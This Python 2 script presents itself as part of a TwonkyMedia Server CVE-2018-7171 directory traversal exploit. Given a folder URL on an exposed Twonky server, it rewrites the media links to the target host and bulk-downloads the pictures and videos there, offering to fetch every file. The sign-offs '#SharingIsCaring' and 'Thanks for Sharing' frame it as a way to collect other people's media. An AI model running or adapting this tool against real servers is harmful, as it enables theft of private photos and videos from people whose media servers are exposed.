#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
* ------------------------------------------------------------------------------
 *
 * This file is part of: TwonkyMedia Server 7.0.11-8.5 Directory Traversal CVE-2018-7171
 *
 * ------------------------------------------------------------------------------
 *
 * BSD 3-Clause License
 *
 * Copyright (c) 2018, Sven Fassbender
 * Author: Sven Fassbender
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this
 *   list of conditions and the following disclaimer.
 *
 * * Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * * Neither the name of the copyright holder nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *
 * * NON-MILITARY-USAGE CLAUSE
 *   Redistribution and use in source and binary form for military use and
 *   military research is not permitted. Infringement of these clauses may
 *   result in publishing the source code of the utilizing applications and
 *   libraries to the public. As this software is developed, tested and
 *   reviewed by *international* volunteers, this clause shall not be refused
 *   due to the matter of *national* security concerns.
 *  
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * ------------------------------------------------------------------------------
'''
try:
	import requests
	from xml.etree import ElementTree
	import wget
	import sys
	import socket
	import os
except:
	print "Missing dependencies. Run 'sudo pip install -r requirements.txt'"

def downloadWorker(tree, twonkyServer, downloadPath):
	for child in tree.iter("res"):
		if "LRG" in child.text or "AVI" in child.text or "MOV" in child.text: # Change resolution here available options LRG, SML, MED
			url = child.text.replace("127.0.0.1",twonkyServer)
			splited = url.split("/")
			splitedTwo = splited[len(splited)-1]
			fileUrl = downloadPath + "/" + splitedTwo[:splitedTwo.find("?")]
			if not os.path.isfile(fileUrl):
				try: 
					wget.download(url, downloadPath)
				except socket.error, e:
					if 'Errno 111' in e:
						print '*** Connection refused ***'
						print '*** Url: %s ***' %url
						pass
					elif 'Errno 10054' in e:
						print '*** Connection closed by Remote Host ***'
						print '*** Url: %s ***' %url
						pass
			else:
				pass
			
	return

# Fetch files from TwonkyMedia Server
def downloadFiles(twonky, twonkyServer, downloadPath):
	twonkyFolderStart = twonky.find("#")
	if twonkyFolderStart != -1:
		twonkyFinalUrl = createTwonkyUrl(twonky, twonkyServer, twonkyFolderStart)
		response = requests.get(twonkyFinalUrl)
		tree = ElementTree.fromstring(response.content)
		for child in tree.iter("childCount"):
			pictureCount = child.text
			break
		if int(pictureCount) >= 30:
			getAll = raw_input("Found %s pictures, get all? [Y, N] "%pictureCount)
		else:
			getAll = "N"
		if getAll.upper() == "Y":
			rangeList = range(0,int(pictureCount),30)
			if rangeList[len(rangeList)-1] < int(pictureCount):
				rangeList[len(rangeList)-1] = int(pictureCount)-30
			for pics in rangeList:
				downloadUrl = twonkyFinalUrl.replace("start=0", "start=" + str(pics))
				response = requests.get(downloadUrl)
				tree = ElementTree.fromstring(response.content)
				downloadWorker(tree, twonkyServer, downloadPath)
		elif getAll.upper() == "N":
			downloadWorker(tree, twonkyServer, downloadPath)
		else:
			print "*** Invalid Input! ***"
		
	else:
		print "*** Invalid Url! ***"
		sys.exit()

# Create the URL
def createTwonkyUrl(twonky, twonkyServer, twonkyFolderStart):
	twonkyUrl = twonky[twonkyFolderStart+1:]
	twonkyUrlFindOne = twonkyUrl.find(":9000")
	twonkyUrlFindTwo = twonkyUrl.find(":9001")
	if twonkyUrlFindOne != -1:
		twonkyFinalUrlEnd = twonkyUrl[twonkyUrlFindOne:]
		twonkyFinalUrl = "http://" + twonkyServer + twonkyFinalUrlEnd
		return twonkyFinalUrl
	elif twonkyUrlFindTwo != -1:
		twonkyFinalUrlEnd = twonkyUrl[twonkyUrlFindTwo:]
		twonkyFinalUrl = "http://" + twonkyServer + twonkyFinalUrlEnd
		return twonkyFinalUrl
	else:
		print "*** Invalid Url! ***"
		sys.exit()

# Check if the local directory exists
def checkCreateDir(downloadPath, twonkyServer):
	directory = downloadPath + twonkyServer
	if not os.path.exists(directory):
		try:
			os.makedirs(directory)
			print "*** Directory %s created. ***" %directory
		except OSError as e:
			print "Error: " %e
			sys.exit()
	else:
		print "*** Directory %s found. ***" %directory
	return directory

# Program start here
def main():
	if len(sys.argv) != 2 :
		print "Usage: " + sys.argv[0] + " [Downloadpath]'"
		sys.exit()
	else:
		downloadPath = sys.argv[1]
	print "-" * 30
	print "#SharingIsCaring"                                                 
	print "-" * 30

	twonky = raw_input("Enter Twonky Folder Url: ")
	twonkyServerStart = twonky.find("http://")
	twonkyServerEndOne = twonky.find(":9000")
	twonkyServerEndTwo = twonky.find(":9001")
	if twonkyServerEndOne != -1:
		twonkyServer = twonky[twonkyServerStart+7:twonkyServerEndOne]

	elif twonkyServerEndTwo != -1:
		twonkyServer = twonky[twonkyServerStart+7:twonkyServerEndTwo]
	else:
		print "*** Invalid Url! ***"
		sys.exit()

	downloadFiles(twonky, twonkyServer, checkCreateDir(downloadPath, twonkyServer))
	continueDownload = raw_input("\nContinue downloading? [Y, N] ")
	if continueDownload.upper() == "Y":
		main()
	else:
		print "\n*** Thanks for Sharing :) ***"
		sys.exit()

main()
